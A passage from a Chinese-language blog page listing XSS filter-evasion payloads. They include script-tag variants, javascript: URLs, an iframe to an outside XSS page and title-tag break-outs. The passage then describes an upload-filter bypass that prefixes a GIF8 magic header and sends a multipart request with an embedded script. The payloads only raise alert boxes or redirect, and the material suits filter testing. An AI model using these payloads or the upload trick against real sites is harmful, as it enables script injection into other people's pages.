</span></span></code></pre></div><h5 id=双开括号>双开括号</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;&lt;</span><span style=color:#a6e22e>SCRIPT</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>alert</span>(<span style=color:#ae81ff>1</span>);<span style=color:#75715e>//&lt;&lt;/SCRIPT&gt;
</span></span></span></code></pre></div><h5 id=半开的htmljavascript-xss>半开的HTML/JavaScript XSS</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>IMG</span> <span style=color:#a6e22e>SRC</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;javascript:alert(1)&#34;</span>
</span></span></code></pre></div><h5 id=双开角括号>双开角括号</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>iframe</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#a6e22e>http</span><span style=color:#f92672>://</span><span style=color:#ae81ff>3</span><span style=color:#a6e22e>w</span><span style=color:#f92672>.</span><span style=color:#a6e22e>org</span><span style=color:#f92672>/</span><span style=color:#a6e22e>XSS</span><span style=color:#f92672>.</span><span style=color:#a6e22e>html</span> <span style=color:#f92672>&lt;</span>
</span></span></code></pre></div><h5 id=无单引号-双引号-分号>无单引号 双引号 分号</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>SCRIPT</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>a</span><span style=color:#f92672>=/</span><span style=color:#a6e22e>XSS</span><span style=color:#f92672>/</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>alert</span>(<span style=color:#a6e22e>a</span><span style=color:#f92672>.</span><span style=color:#a6e22e>source</span>)<span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>SCRIPT</span><span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><h5 id=换码过滤的javascript>换码过滤的JavaScript</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>\</span><span style=color:#e6db74>&#34;;alert(1);//
</span></span></span></code></pre></div><h5 id=结束title标签>结束Title标签</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>TITLE</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>SCRIPT</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>alert</span>(<span style=color:#ae81ff>1</span>);<span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>SCRIPT</span><span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><h5 id=节省http>节省[http:]</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>A</span> <span style=color:#a6e22e>HREF</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;//www.google.com/&#34;</span><span style=color:#f92672>&gt;</span><span style=color:#ae81ff>1</span><span style=color:#f92672>/</span><span style=color:#a6e22e>A</span><span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><h5 id=节省www>节省[www]</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>A</span> <span style=color:#a6e22e>HREF</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://google.com/&#34;</span><span style=color:#f92672>&gt;</span><span style=color:#ae81ff>1</span><span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>A</span><span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><h5 id=绝对点绝对dns>绝对点绝对DNS</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>A</span> <span style=color:#a6e22e>HREF</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://www.google.com./&#34;</span><span style=color:#f92672>&gt;</span><span style=color:#ae81ff>1</span><span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>A</span><span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><h5 id=javascript链接>javascript链接</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>A</span> <span style=color:#a6e22e>HREF</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;javascript:document.location=&#39;http://www.google.com/&#39;&#34;</span><span style=color:#f92672>&gt;</span><span style=color:#ae81ff>1</span><span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>A</span><span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><h1 id=上传绕过>上传绕过</h1><p>Web应用通常会检测目标文件的文件头，并以此判断是否合法。在上传过滤函数中，一般只会检验文件头中的前四个字节。例如，下面这几个图像文件被检测的字节：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>JPEG</span><span style=color:#f92672>-</span> <span style=color:#a6e22e>FF</span> <span style=color:#a6e22e>D8</span> <span style=color:#a6e22e>FF</span> <span style=color:#a6e22e>DB</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>ÿØÿÛ</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>GIF</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>47494638</span><span style=color:#f92672>-</span> <span style=color:#a6e22e>GIF8</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>PNG</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>89504</span><span style=color:#a6e22e>E</span> <span style=color:#ae81ff>47</span><span style=color:#f92672>-</span> <span style=color:#a6e22e>‰PNG</span>
</span></span></code></pre></div><p>如果要利用这点，仅需做到两点。</p><blockquote><p>错误的文件扩展，上传该文件，以混淆浏览器;
添加神奇的文字头：GIF8</p></blockquote><p>发送请求：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>----------------------------</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>6683303835495</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>Content</span><span style=color:#f92672>-</span><span style=color:#a6e22e>Disposition</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>form</span><span style=color:#f92672>-</span><span style=color:#a6e22e>data</span>; <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;upload&#34;</span>; <span style=color:#a6e22e>filename</span><span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;badfile.&#39;&#39;gif&#34;</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>Content</span><span style=color:#f92672>-</span><span style=color:#a6e22e>Type</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>image</span><span style=color:#f92672>/</span><span style=color:#a6e22e>png</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>GIF8</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>html</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>alert</span>(<span style=color:#ae81ff>1</span>)<span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;&lt;/</span><span style=color:#a6e22e>html</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>----------------------------</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>6683303835495</span><span style=color:#f92672>--</span>
</span></span></code></pre></div><p>参考：
吕滔博客 <a href=https://lvtao.net/dev/xss.html>https://lvtao.net/dev/xss.html</a></p></div></article></main></div></div><footer class=footer><div class="container footer__container flex"><div class=footer__copyright>&copy; 2026 臭大佬博客.
<span class=footer__copyright-credits>基于 <a href=https://gohugo.io/ rel="nofollow noopener" target=_blank>Hugo</a> 引擎和 <a href=https://github.com/Vimux/Mainroad/ rel="nofollow noopener" target=_blank>Mainroad</a> 主题</span></div></div></footer></div><script async defer src=/js/menu.js></script></body></html>